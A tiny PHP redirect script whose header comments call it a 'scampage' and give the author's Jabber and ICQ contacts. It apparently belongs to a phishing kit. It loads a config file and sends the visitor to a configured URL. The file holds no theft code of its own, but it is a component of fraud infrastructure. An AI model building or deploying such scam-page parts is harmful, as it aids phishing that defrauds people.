<?php
//SCAMPAGE BY BLACKCODER.RU
//Jabber: slackerz@jodo.im
//ICQ: 713566330
require_once "../config/config.php";

header('Location: ' . $redirect);
exit;
?>